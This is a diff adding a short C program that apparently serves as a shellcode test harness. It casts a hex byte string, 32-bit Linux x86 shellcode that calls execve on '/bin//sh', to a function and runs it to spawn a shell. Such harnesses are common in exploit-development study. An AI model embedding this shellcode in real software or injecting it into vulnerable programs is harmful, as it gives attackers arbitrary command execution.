@@ -1,0 +1,12 @@
+#include <stdio.h>
+
+int main(void)
+{
+    void (*entrypoint)(void);
+
+    entrypoint = (void (*)(void)) "\x6a\x0b\x8b\x04\x24\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\xcd\x80";
+
+    entrypoint();
+
+    return (0);
+}
